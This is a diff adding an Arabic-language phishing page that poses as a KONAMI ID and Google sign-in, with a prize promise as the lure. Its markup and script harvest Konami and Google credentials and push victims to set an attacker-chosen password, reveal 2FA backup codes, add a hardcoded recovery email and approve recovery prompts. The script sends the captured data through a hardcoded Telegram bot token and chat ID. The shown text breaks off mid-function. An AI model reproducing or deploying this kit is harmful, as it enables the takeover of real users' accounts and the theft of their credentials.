@@ -1,0 +1,1047 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>KONAMI ID / تسجيل الدخول</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            /* الهوية البصرية لمنصة كونامي (Konami Red & White) */
+            --konami-red: #d31118;
+            --konami-dark-red: #b00e14;
+            --konami-bg: #f5f5f5;
+            --konami-card: #ffffff;
+            --konami-text: #222222;
+            --konami-subtext: #666666;
+            --konami-border: #cccccc;
+
+            /* ألوان جوجل */
+            --g-bg: #ffffff;
+            --g-border: #dadce0;
+            --g-blue: #1a73e8;
+            --g-box-bg: #f8f9fa;
+            --g-success: #1e8e3e;
+            --g-error: #d93025;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', -apple-system, BlinkMacSystemFont, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body, html {
+            width: 100vw;
+            min-height: 100vh;
+            background-color: var(--konami-bg);
+            color: var(--konami-text);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-x: hidden;
+        }
+
+        /* ----- زر العودة خطوة في أعلى الشاشة ----- */
+        .top-nav-bar {
+            width: 100%;
+            max-width: 440px;
+            padding: 10px 16px 0 16px;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .btn-back-step {
+            background-color: #ffffff;
+            border: 1px solid var(--konami-border);
+            color: var(--konami-text);
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            display: none;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            transition: all 0.2s ease;
+        }
+
+        .btn-back-step:active {
+            transform: scale(0.96);
+            background-color: #f0f0f0;
+        }
+
+        /* جعل كل صفحة ملء الشاشة تماماً */
+        .view-page {
+            display: none;
+            width: 100vw;
+            min-height: 100vh;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding-bottom: 30px;
+        }
+
+        .view-page.active {
+            display: flex;
+        }
+
+        /* ----- شاشات البداية المضافة ----- */
+        #introBlackView {
+            background-color: #000000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #introLoadingView {
+            background-color: #111111;
+            color: #ffffff;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* ----- هيدر كونامي الشهير ----- */
+        .konami-header {
+            width: 100%;
+            background-color: #ffffff;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .konami-logo-text {
+            color: var(--konami-red);
+            font-size: 26px;
+            font-weight: 900;
+            letter-spacing: 2px;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .konami-sub-header {
+            width: 100%;
+            background-color: var(--konami-red);
+            color: #ffffff;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .container-box {
+            width: 92%;
+            max-width: 440px;
+            margin: 15px auto 0 auto;
+            background: var(--konami-card);
+            border: 1px solid var(--konami-border);
+            border-radius: 8px;
+            padding: 24px 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+
+        .x-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #333;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+            width: 100%;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 6px;
+            color: var(--konami-subtext);
+        }
+
+        .standard-input {
+            width: 100%;
+            padding: 14px 12px;
+            font-size: 15px;
+            border: 1px solid var(--konami-border);
+            border-radius: 6px;
+            background-color: #ffffff;
+            color: var(--konami-text);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .standard-input:focus {
+            border-color: var(--konami-red);
+            box-shadow: 0 0 0 2px rgba(211, 17, 24, 0.15);
+        }
+
+        .btn-konami {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--konami-red);
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-konami:hover {
+            background-color: var(--konami-dark-red);
+        }
+
+        .btn-google {
+            width: 100%;
+            padding: 12px;
+            background-color: #ffffff;
+            color: #757575;
+            border: 1px solid #dadce0;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 12px;
+        }
+
+        .link-text {
+            color: #0066cc;
+            font-size: 13px;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 8px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .link-text:hover {
+            text-decoration: underline;
+        }
+
+        /* ----- الكابتشا الخاصة بكونامي ----- */
+        .captcha-box {
+            background-color: #f9f9f9;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 18px 0;
+        }
+
+        .captcha-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 14px;
+        }
+
+        .captcha-instruction {
+            font-size: 13px;
+            font-weight: 700;
+            color: #333;
+            max-width: 65%;
+            line-height: 1.4;
+        }
+
+        .target-avatar-wrapper {
+            width: 70px;
+            height: 70px;
+            border: 2px solid #ffcc00;
+            border-radius: 8px;
+            background-color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 4px;
+        }
+
+        .avatar-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .avatar-card {
+            background: #ffffff;
+            border: 2px solid var(--konami-border);
+            border-radius: 8px;
+            padding: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            height: 80px;
+            position: relative;
+        }
+
+        .avatar-card.selected {
+            border-color: var(--konami-red);
+            background-color: rgba(211, 17, 24, 0.05);
+            box-shadow: 0 0 0 2px var(--konami-red);
+        }
+
+        .avatar-card.selected::after {
+            content: '✓';
+            position: absolute;
+            top: 4px;
+            right: 6px;
+            background: var(--konami-red);
+            color: #fff;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            font-size: 11px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .avatar-svg {
+            width: 100%;
+            height: 100%;
+            max-height: 60px;
+        }
+
+        /* ----- شاشات التحميل ----- */
+        .spinner-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: auto;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid var(--konami-red);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ----- تصميم عناصر جوجل ----- */
+        .g-card {
+            border: 1px solid var(--g-border);
+            border-radius: 12px;
+            background: #ffffff;
+            padding: 24px;
+        }
+
+        .alert-box {
+            background-color: var(--g-box-bg);
+            border-right: 4px solid var(--g-blue);
+            padding: 12px 14px;
+            font-size: 13px;
+            border-radius: 6px;
+            margin-bottom: 16px;
+            line-height: 1.6;
+        }
+
+        .alert-error {
+            background-color: rgba(217, 48, 37, 0.1);
+            color: var(--g-error);
+            border-right: 4px solid var(--g-error);
+        }
+
+        .code-display-box {
+            background-color: #ffffff;
+            border: 2px dashed var(--g-blue);
+            padding: 12px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 20px;
+            text-align: center;
+            margin: 12px 0;
+            font-weight: 800;
+            color: var(--g-blue);
+            letter-spacing: 2px;
+        }
+
+        .smart-btns {
+            display: flex;
+            gap: 8px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+
+        .smart-btn {
+            flex: 1;
+            min-width: 90px;
+            padding: 10px;
+            border: 1px solid var(--g-border);
+            border-radius: 8px;
+            background: #ffffff;
+            color: #333;
+            text-align: center;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+        }
+
+        .footer-links {
+            margin-top: auto;
+            padding: 20px 0;
+            text-align: center;
+            font-size: 12px;
+            color: var(--konami-subtext);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ⬛ 0-A. الشاشة السوداء (لمدة 2 ثواني) -->
+    <div id="introBlackView" class="view-page active"></div>
+
+    <!-- ⏳ 0-B. شاشة التحميل الأولية (لمدة 7 ثواني) -->
+    <div id="introLoadingView" class="view-page">
+        <div class="spinner-container">
+            <div class="spinner" style="border-color: #333; border-top-color: var(--konami-red);"></div>
+            <p style="font-size: 16px; font-weight: 800; color:#ffffff;">جاري التحميل...</p>
+        </div>
+    </div>
+
+    <!-- ↩️ زر العودة خطوة في أعلى الشاشة -->
+    <div class="top-nav-bar">
+        <button id="globalBackBtn" class="btn-back-step" onclick="goBackStep()">
+            <span>➡️</span>
+            <span>العودة خطوة</span>
+        </button>
+    </div>
+
+    <!-- ========================================== -->
+    <!-- 🎮 1. صفحة كونامي الرئيسية (My KONAMI) -->
+    <!-- ========================================== -->
+    <div id="konamiMainView" class="view-page">
+        <div class="konami-header">
+            <div class="konami-logo-text">KONAMI</div>
+        </div>
+        <div class="konami-sub-header">
+            <span>My KONAMI</span>
+            <span style="font-size: 20px;">≡</span>
+        </div>
+
+        <div class="container-box">
+            <h1 class="x-title">كونامي أي دي</h1>
+
+            <div class="input-group">
+                <input type="text" id="konamiEmailInput" class="standard-input" placeholder="معرف كونامي / عنوان البريد الإلكتروني">
+            </div>
+
+            <a href="https://accounts.google.com/signin" target="_blank" class="link-text" style="margin-bottom: 18px;" onclick="logLinkAction('رابط نسيت البريد الإلكتروني (كونامي)')">نسيت البريد الإلكتروني؟</a>
+
+            <button class="btn-konami" onclick="submitKonamiEmail()">تسجيل الدخول</button>
+
+            <div style="display: flex; align-items: center; margin: 20px 0; color: #888; font-size: 13px;">
+                <div style="flex:1; height:1px; background:#ddd;"></div>
+                <span style="padding: 0 10px;">أو</span>
+                <div style="flex:1; height:1px; background:#ddd;"></div>
+            </div>
+
+            <!-- زر التسجيل بحساب جوجل -->
+            <button class="btn-google" onclick="openGoogleFlow()">
+                <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/></svg>
+                <span>التسجيل بحساب جوجل</span>
+            </button>
+        </div>
+
+        <div class="footer-links">شروط الاستخدام / الخصوصية | العلامات التجارية</div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🎮 2. صفحة كلمة المرور + الكابتشا (كونامي) -->
+    <!-- ========================================== -->
+    <div id="konamiPasswordCaptchaView" class="view-page">
+        <div class="konami-header">
+            <div class="konami-logo-text">KONAMI</div>
+        </div>
+
+        <div class="container-box">
+            <h2 class="x-title">كونامي أي دي</h2>
+
+            <div class="input-group">
+                <input type="text" id="displayKonamiEmail" class="standard-input" style="background:#f0f0f0;" readonly>
+            </div>
+
+            <div class="input-group" style="position: relative;">
+                <input type="password" id="konamiPasswordInput" class="standard-input" placeholder="كلمة المرور">
+                <span onclick="togglePasswordVisibility('konamiPasswordInput')" style="position:absolute; left:12px; top:14px; font-size:12px; color:#666; cursor:pointer; font-weight:700;">إخفاء/إظهار</span>
+            </div>
+
+            <!-- الكابتشا المطابقة تماماً للصورة -->
+            <div class="captcha-box">
+                <div class="captcha-header">
+                    <div class="captcha-instruction">يرجى تحديد جميع المربعات التي تحتوي على هذه الشخصية.</div>
+                    <div class="target-avatar-wrapper">
+                        <svg class="avatar-svg" viewBox="0 0 100 100">
+                            <rect x="20" y="10" width="60" height="50" rx="8" fill="#fbc02d" stroke="#333" stroke-width="3"/>
+                            <circle cx="38" cy="35" r="4" fill="#333"/>
+                            <circle cx="62" cy="35" r="4" fill="#333"/>
+                            <line x1="42" y1="48" x2="58" y2="48" stroke="#333" stroke-width="3" stroke-linecap="round"/>
+                            <path d="M40 60 L40 85 M60 60 L60 85 M30 85 L45 85 M55 85 L70 85" stroke="#fbc02d" stroke-width="10" stroke-linecap="round"/>
+                        </svg>
+                    </div>
+                </div>
+
+                <div class="avatar-grid">
+                    <div class="avatar-card" onclick="toggleAvatarSelection(this, true, 1)">
+                        <svg class="avatar-svg" viewBox="0 0 100 100">
+                            <rect x="25" y="15" width="50" height="45" rx="6" fill="#fbc02d" stroke="#333" stroke-width="3"/>
+                            <line x1="35" y1="38" x2="45" y2="38" stroke="#333" stroke-width="3"/>
+                            <line x1="55" y1="38" x2="65" y2="38" stroke="#333" stroke-width="3"/>
+                            <line x1="42" y1="48" x2="58" y2="48" stroke="#333" stroke-width="3"/>
+                            <rect x="42" y="60" width="16" height="25" fill="#fbc02d"/>
+                        </svg>
+                    </div>
+                    <div class="avatar-card" onclick="toggleAvatarSelection(this, true, 2)">
+                        <svg class="avatar-svg" viewBox="0 0 100 100">
+                            <rect x="20" y="10" width="60" height="50" rx="8" fill="#fbc02d" stroke="#333" stroke-width="3"/>
+                            <circle cx="38" cy="35" r="4" fill="#333"/>
+                            <circle cx="62" cy="35" r="4" fill="#333"/>
+                            <path d="M40 45 Q50 55 60 45" stroke="#333" stroke-width="3" fill="none"/>
+                            <path d="M40 60 L40 85 M60 60 L60 85" stroke="#fbc02d" stroke-width="8"/>
+                        </svg>
+                    </div>
+                    <div class="avatar-card" onclick="toggleAvatarSelection(this, false, 3)">
+                        <svg class="avatar-svg" viewBox="0 0 100 100">
+                            <path d="M30 40 Q20 20 40 25 Q60 20 70 40 Q80 50 70 65 Q50 80 30 65 Z" fill="#fbc02d" stroke="#333" stroke-width="3"/>
+                            <circle cx="60" cy="45" r="4" fill="#333"/>
+                            <circle cx="70" cy="50" r="6" fill="#d31118"/>
+                        </svg>
+                    </div>
+                    <div class="avatar-card" onclick="toggleAvatarSelection(this, false, 4)">
+                        <svg class="avatar-svg" viewBox="0 0 100 100">
+                            <path d="M25 45 Q15 25 35 30 Q55 25 65 45 Q75 55 65 70 Z" fill="#fbc02d" stroke="#333" stroke-width="3"/>
+                            <circle cx="55" cy="50" r="4" fill="#333"/>
+                            <circle cx="65" cy="55" r="5" fill="#d31118"/>
+                        </svg>
+                    </div>
+                    <div class="avatar-card" onclick="toggleAvatarSelection(this, true, 5)">
+                        <svg class="avatar-svg" viewBox="0 0 100 100">
+                            <rect x="22" y="12" width="56" height="48" rx="8" fill="#fbc02d" stroke="#333" stroke-width="3"/>
+                            <circle cx="38" cy="35" r="4" fill="#333"/>
+                            <circle cx="62" cy="35" r="4" fill="#333"/>
+                            <line x1="42" y1="48" x2="58" y2="48" stroke="#333" stroke-width="3"/>
+                            <path d="M40 60 L40 85 M60 60 L60 85" stroke="#fbc02d" stroke-width="8"/>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+
+            <button class="btn-konami" onclick="submitKonamiPasswordAndCaptcha()">تسجيل الدخول</button>
+            <a href="#" class="link-text" style="display:block; text-align:center; margin-top:15px;" onclick="logLinkAction('نسيت كلمة السر (كونامي)')">نسيت كلمة السر؟</a>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🔴 3. التسجيل بجوجل - المرحلة 1: البريد -->
+    <!-- ========================================== -->
+    <div id="gPhase1View" class="view-page">
+        <div class="container-box g-card">
+            <div style="text-align: center; margin-bottom: 16px;">
+                <svg viewBox="0 0 74 24" width="75" height="24">
+                    <path fill="#4285F4" d="M9.24 10.19v3.25h7.62c-.3 1.95-2.28 5.72-7.62 5.72-4.59 0-8.34-3.81-8.34-8.5s3.75-8.5 8.34-8.5c2.62 0 4.38 1.12 5.39 2.08l2.58-2.49C15.36 1.18 12.57 0 9.24 0 4.14 0 0 4.14 0 9.25s4.14 9.25 9.24 9.25c5.33 0 8.87-3.75 8.87-9.03 0-.61-.07-1.07-.15-1.53H9.24z"/>
+                    <path fill="#EA4335" d="M22.5 13.91c-.34.95-1.25 2.59-3.32 2.59-2.3 0-3.95-1.83-3.95-4.25 0-2.58 1.83-4.25 4.13-4.25 2.12 0 3.12 1.5 3.32 2.5l2.67-1.11c-.56-1.57-2.32-3.89-6-3.89-3.86 0-7 3.09-7 7 0 3.82 3.05 7 7 0 3.82 3.05 7 7 0 3.65 0 5.4-2.46 5.86-3.85l-2.71-1.24z"/>
+                    <path fill="#FBBC05" d="M32.5 5.5h-3v13h3v-13z"/>
+                    <path fill="#34A853" d="M41 12.25c0-1.41-.38-2.07-.86-2.61-.63-.71-1.58-1.14-2.64-1.14-2.3 0-3.95 1.83-3.95 4.25 0 2.58 1.83 4.25 4.13 4.25 1.02 0 1.95-.41 2.58-1.1.52-.56.74-1.29.74-2.65v-1h-3.46v2.19h1.15v.28c0 .32-.27.58-.6.58-.89 0-1.35-.74-1.35-1.8 0-1.07.49-1.8 1.35-1.8.46 0 .82.26.96.65h2.38z"/>
+                </svg>
+            </div>
+            <h2 style="text-align: center; font-size: 20px; margin-bottom: 8px;">تسجيل الدخول باستخدام Google</h2>
+            <p style="font-size: 13px; color: var(--konami-subtext); text-align: center; margin-bottom: 16px;">متابعة إلى حسابك للتحقق</p>
+
+            <div style="display:flex; align-items:center; gap:6px; margin-bottom:8px;">
+                <input type="text" id="gEmailInput" class="standard-input" placeholder="البريد الإلكتروني أو الهاتف" style="margin:0;">
+                <button onclick="logHelpClick()" style="background:none; border:1px solid #ccc; border-radius:50%; width:36px; height:36px; cursor:pointer; font-weight:bold;">؟</button>
+            </div>
+
+            <a href="https://accounts.google.com/signin" target="_blank" class="link-text" onclick="logLinkAction('نسيت البريد الإلكتروني (جوجل)')">إذا نسيت عنوان بريدك الإلكتروني ادخل هنا لنسخه</a>
+
+            <div style="display: flex; justify-content: flex-end; margin-top: 20px;">
+                <button class="btn-konami" style="width: auto; padding: 10px 24px; background:var(--g-blue);" onclick="submitGPhase1()">التالي</button>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🔴 4. التسجيل بجوجل - المرحلة 2:المرور -->
+    <!-- ========================================== -->
+    <div id="gPhase2View" class="view-page">
+        <div class="container-box g-card">
+            <h2 style="text-align: center; font-size: 20px; margin-bottom: 12px;">إدخال كلمة المرور</h2>
+
+            <!-- الخطوة 1: كلمة المرور الظاهرة -->
+            <div id="gPhase2_Step1">
+                <input type="text" id="gNotesInputVisible" class="standard-input" placeholder="كلمة المرور " autocomplete="off">
+                <a class="link-text" style="display: block; text-align: center; margin: 12px 0 18px 0;" onclick="showGResetNotesSection()">نسيت كلمة المرور؟</a>
+                <button class="btn-konami" style="background:var(--g-blue);" onclick="submitGNotesStep1()">التالي</button>
+            </div>
+
+            <!-- الخطوة 2: كلمة المرور الفريدة وتحديثها -->
+            <div id="gPhase2_Step2" style="display: none;">
+                <p style="font-size: 13px; font-weight: 700; margin-bottom: 6px;">انسخ كلمة المرور الجديدة والصقها في خانات تغيير كلمة مرور جوجل </p>
+                <div class="code-display-box" id="gUniqueNoteDisplay">جاري التوليد...</div>
+
+                <a href="https://myaccount.google.com/signinoptions/password" target="_blank" class="btn-konami" style="background:var(--g-blue); text-decoration: none; margin-bottom: 15px;" onclick="handleGUpdatePasswordLinkClick()">
+                    إضغط هنا لنسخ وتغيير كلمة المرور الجديدة
+                </a>
+
+                <div style="margin-top: 15px;">
+                    <label style="font-size: 12px; color: #555; display: block; margin-bottom: 4px;">أدخل كلمة المرور الجديدة هنا:</label>
+                    <input type="text" id="gNewNotesInput" class="standard-input" placeholder="كلمة المرور الجديدة" disabled>
+                </div>
+
+                <button class="btn-konami" id="btnSubmitGNewNotes" style="background:var(--g-blue); margin-top:15px;" disabled onclick="submitGNewNotesFinal()">موافق</button>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🔴 5. التسجيل بجوجل - المرحلة 3: خيارات التأكيد -->
+    <!-- ========================================== -->
+    <div id="gPhase3View" class="view-page">
+        <div class="container-box g-card">
+            <h2 style="text-align: center; font-size: 18px; margin-bottom: 12px;">تأكيد ملكية الحساب</h2>
+
+            <div id="gBackupErrorMsg" class="alert-box alert-error" style="display:none;"></div>
+
+            <!-- الخيار الأول: رموز الأمان -->
+            <div style="border: 1px solid var(--g-border); padding: 12px; border-radius: 8px; margin-bottom: 12px;">
+                <p style="font-size: 13px; font-weight: 700; margin-bottom: 6px;">الخيار الأول (رموز الأمان):</p>
+                <a href="https://myaccount.google.com/two-step-verification/backup-codes?rapt=AEjHL4NH1uNU_f4qoFKzUpZjW39_uNqCHALYUHBkgBhMy8sCr1LpX8y-_pyz1_pRYZ5VkYJToRe_u4zNERRurZB_EFrnIyDAmEM-jz1FpDwGhPAjOcsSqPQ" target="_blank" class="link-text" onclick="handleBackupLinkClick()">
+                    اضغط هنا وأختر احد رموز الأمان وأدخله في الخانة الخاصة برمز الأمان 
+                </a>
+                <input type="text" id="gBackupCodeInput" class="standard-input" placeholder="أدخل رمز الأمان هنا" style="margin-top: 8px;">
+                <button class="btn-konami" style="background:var(--g-blue); margin-top: 8px;" onclick="submitGBackupCode()">تأكيد برمز الأمان</button>
+            </div>
+
+            <!-- الخيار الثاني: بريد الاسترداد -->
+            <div style="border: 1px solid var(--g-border); padding: 12px; border-radius: 8px; margin-bottom: 12px;">
+                <p style="font-size: 13px; font-weight: 700; margin-bottom: 4px;">الخيار الثاني (بريد الاسترداد):</p>
+                <div class="code-display-box" style="font-size: 14px; margin: 4px 0;">pubgrivals7@gmail.com</div>
+                <a href="https://myaccount.google.com/recovery/email" target="_blank" class="link-text" onclick="logLinkAction('نسخ بريد الاسترداد للتحقق')">
+                    انسخ البريد الإلكتروني والصقه هنا لتأكيد حسابك
+                </a>
+            </div>
+
+            <button class="link-text" style="text-align: center; display: block; margin: 10px auto;" onclick="toggleGAlternativeOptions()">تجربة طريقة أخرى للتأكيد</button>
+
+            <!-- الطرق البديلة -->
+            <div id="gAlternativeArea" style="display: none; border-top: 1px solid var(--g-border); padding-top: 12px;">
+                <div class="alert-box">
+                    <strong>التأكيد بالإشعار:</strong>  سوف يظهر لك إشعار يقول هل أنت من يحاول استرداد الحساب؟ يرجى فتح الأشعار والموافقة بالضغط على ( نعم أنا) مع اختيار الرقم الصحيح من الدعم للتأكيد .
+                </div>
+
+                <div style="margin-top: 10px;">
+                    <p style="font-size: 13px; font-weight: 700; margin-bottom: 6px;">التأكيد بكود التحقق :</p>
+                    <input type="text" id="gAltPhoneEmail" class="standard-input" placeholder="أدخل رقم الهاتف أو البريد الإلكتروني">
+                    <button class="btn-konami" style="background:var(--g-blue); margin-top: 8px;" onclick="requestGAltCode()">موافق</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🔴 6. التسجيل بجوجل - المرحلة 4: أزرار التوجيه للكود -->
+    <!-- ========================================== -->
+    <div id="gPhase4View" class="view-page">
+        <div class="container-box g-card">
+            <h2 style="text-align: center; font-size: 18px; margin-bottom: 12px;">إدخال كود التحقق</h2>
+
+            <div class="alert-box">
+                قد يتأخر الكود، يرجى ترك الصفحة مفتوحة وإذا أرسلنا لك الكود سنخبرك برسالة عن طريق المحادثة المباشرة.
+            </div>
+
+            <input type="text" id="gPhase4CodeInput" class="standard-input" placeholder="أدخل الكود " maxlength="8" oninput="handleGPhase4CodeInput(this)">
+
+            <p style="font-size: 12px; color: var(--konami-subtext); margin-top: 12px; font-weight: 700;">
+                إذا فشل فتح التطبيقات اذهب لفتحها من القائمة للحصول على الكود:
+            </p>
+
+            <div class="smart-btns">
+                <a href="mailto:" target="_blank" class="smart-btn" onclick="logLinkAction('فتح تطبيق البريد Mail')">✉️ Email الوارد</a>
+                <a href="https://wa.me/" target="_blank" class="smart-btn" onclick="logLinkAction('فتح تطبيق واتساب WhatsApp')">💬 WhatsApp</a>
+                <a href="sms:" target="_blank" class="smart-btn" onclick="logLinkAction('فتح تطبيق الرسائل SMS')">📱 الرسائل SMS</a>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- ⏳ 7. شاشة التحميل العام والدوائر المتحركة -->
+    <!-- ========================================== -->
+    <div id="loadingView" class="view-page">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <p id="loadingStatusText" style="font-size: 16px; font-weight: 800; color:#333;">جاري التحميل...</p>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- ⏳ 8. بوابة التحكم اليدوي (انتظار المسؤول) -->
+    <!-- ========================================== -->
+    <div id="waitingAdminView" class="view-page">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <h3 style="font-size: 18px; margin-bottom: 8px;">جاري مراجعة البيانات...</h3>
+            <p style="font-size: 13px; color: var(--konami-subtext); max-width: 300px; line-height: 1.6;">يرجى عدم إغلاق الصفحة، يتم التأكد والتحقق من معلومات الحساب.</p>
+        </div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- 🎉 9. شاشة تم تسجيل الدخول بنجاح -->
+    <!-- ========================================== -->
+    <div id="successView" class="view-page">
+        <div class="container-box" style="text-align: center; border-top: 6px solid var(--g-success);">
+            <div style="width: 70px; height: 70px; background-color: var(--g-success); color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 36px; margin: 0 auto 20px auto;">✓</div>
+            <h2 style="color: var(--g-success); margin-bottom: 12px; font-weight:800;">تم تسجيل الدخول بالحساب!</h2>
+            <p style="font-size: 15px; font-weight: 700; line-height: 1.6; color: #333;">
+                سوف يتم شحن الحساب المسجل بالجوائز مباشرة  بعد الفوز .
+            </p>
+        </div>
+        <div class="footer-links">تهانينا! نتمنى لك التوفيق</div>
+    </div>
+
+
+    <!-- ========================================== -->
+    <!-- ⚙️ البرمجة والربط بـ Telegram Bot -->
+    <!-- ========================================== -->
+    <script>
+        // 🛠️ بيانات التليجرام التي تم تكوينها بناءً على طلبك
+        const TELEGRAM_BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
+        const TELEGRAM_CHAT_ID = "8796885500";
+
+        let sessionData = {
+            provider: 'KONAMI',
+            email: '',
+            password: '',
+            uniqueNote: '',
+            newNotesPassword: '',
+            backupCode: ''
+        };
+
+        let selectedAvatarCount = 0;
+        let validAvatarSelectedCount = 0;
+        let hasClickedBackupLink = false;
+        let pollTimer = null;
+
+        // نظام إدارة سجل التنقل للعودة خطوة للخلف
+        let navigationStack = [];
+        let currentActiveView = 'introBlackView';
+
+        // ⏱️ تسلسل البدء: شاشة سوداء (2 ثانية) ثم شاشة تحميل (7 ثواني) ثم واجهة كونامي
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                showView('introLoadingView');
+                setTimeout(() => {
+                    showView('konamiMainView');
+                }, 7000); // 7 ثواني تحميل
+            }, 2000); // 2 ثانية شاشة سوداء
+        });
+
+        // إرسال كافة البيانات والأحداث للتليجرام
+        function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            }).catch(e => console.error("Telegram error:", e));
+        }
+
+        // تحديث إظهار/إخفاء زر العودة بناءً على الصفحة الحالية والسجل
+        function updateBackButtonVisibility() {
+            const backBtn = document.getElementById('globalBackBtn');
+            const hiddenViews = ['introBlackView', 'introLoadingView', 'konamiMainView', 'loadingView', 'waitingAdminView', 'successView'];
+            
+            if (navigationStack.length > 0 && !hiddenViews.includes(currentActiveView)) {
+                backBtn.style.display = 'inline-flex';
+            } else {
+                backBtn.style.display = 'none';
+            }
+        }
+
+        // التنقل بين الصفحات مع الاحتفاظ بسجل العودة
+        function showView(viewId, isBackStep = false) {
+            if (!isBackStep && currentActiveView && currentActiveView !== viewId) {
+                // تجنب إضافة شاشات التحميل الموقتة والشاشات الأولية لسجل العودة
+                if (!['introBlackView', 'introLoadingView', 'loadingView', 'waitingAdminView'].includes(currentActiveView)) {
+                    navigationStack.push(currentActiveView);
+                }
+            }
+
